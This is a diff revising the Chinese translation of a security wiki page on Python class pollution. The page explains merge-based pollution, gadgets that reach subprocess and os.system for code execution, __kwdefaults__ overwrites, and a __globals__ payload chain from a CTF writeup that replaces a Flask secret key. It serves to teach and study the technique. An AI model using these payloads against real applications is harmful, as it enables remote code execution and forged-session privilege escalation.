@@ -1,10 +1,10 @@
-# 类污染（Python 的原型污染）
+# Class Pollution（Python 的 Prototype Pollution）
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## 基本示例
 
-检查如何通过字符串污染对象的类：
+查看如何使用字符串污染对象的 classes：<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## 基本漏洞示例
+## 基础漏洞示例
 ```python
 # Initial state
 class Employee: pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Gadget Examples
+## Gadget 示例
 
 <details>
 
-<summary>创建类属性默认值以实现RCE（子进程）</summary>
+<summary>创建类属性默认值以实现 RCE（subprocess）</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>通过 <code>globals</code> 污染其他类和全局变量</summary>
+<summary>通过 <code>globals</code> 污染其他类和全局变量</summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>任意子进程执行</summary>
+<summary>任意 subprocess 执行</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -182,7 +182,7 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <summary>覆盖 <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** 是所有函数的一个特殊属性，基于 Python [documentation](https://docs.python.org/3/library/inspect.html)，它是“任何 **仅限关键字** 参数的默认值的映射”。污染此属性使我们能够控制函数的仅限关键字参数的默认值，这些参数是在 \* 或 \*args 之后的函数参数。
+**`__kwdefaults__`** 是所有函数的特殊属性，根据 Python [documentation](https://docs.python.org/3/library/inspect.html)，它是“**keyword-only** 参数的所有默认值的映射”。污染此属性允许我们控制函数的 keyword-only 参数的默认值，这些参数是位于 \* 或 \*args 之后的函数参数。<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,32 +223,34 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>跨文件覆盖 Flask 秘密</summary>
+<summary>跨文件覆盖 Flask secret</summary>
 
-因此，如果您可以对在网络的主 Python 文件中定义的对象进行类污染，但**其类在与主文件不同的文件中定义**。因为为了在之前的有效载荷中访问 \_\_globals\_\_，您需要访问对象的类或类的方法，您将能够**访问该文件中的全局变量，但无法访问主文件中的全局变量**。\
-因此，您**将无法访问定义了主页面中**秘密密钥**的 Flask 应用全局对象**：
+因此，如果你能对 Web 的主 python 文件中定义的某个 object 执行 class pollution，**但该 object 的 class 定义在不同于主文件的另一个文件中**，就会出现这种情况。因为要在之前的 payloads 中访问 \_\_globals\_\_，你需要访问该 object 的 class 或该 class 的 methods，所以你将能够**访问该文件中的 globals，但无法访问主文件中的 globals**。 \
+因此，你**无法访问在主页面中定义了** **secret key** 的 Flask app global object：<sup>[[1]](#references)</sup>。
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-在这种情况下，您需要一个小工具来遍历文件，以便访问全局对象 `app.secret_key`，以更改 Flask 秘钥并能够 [**提升权限** 知道这个密钥](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)。
+在此场景中，你需要一个 gadget 来遍历文件，以找到主文件，从而**访问全局对象 `app.secret_key`**，更改 Flask secret key，并在知道该 key 的情况下[**提升权限**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)。
 
-像这样的有效载荷 [来自这篇文章](https://ctftime.org/writeup/36082):
+类似于这个[来自该 writeup 的 payload](https://ctftime.org/writeup/36082)：<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-使用此有效载荷来**更改 `app.secret_key`**（您应用中的名称可能不同），以便能够签署新的和更具权限的 flask cookies。
+Use 此 payload **change `app.secret_key`**（你的 app 中名称可能不同），以便签署具有更多权限的新 Flask cookies。
 
 </details>
 
-还请查看以下页面以获取更多只读小工具：
+另请查看以下页面，了解更多 read-only gadgets：
+
 
 {{#ref}}
 python-internal-read-gadgets.md
 {{#endref}}
 
-## 参考
+## References
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
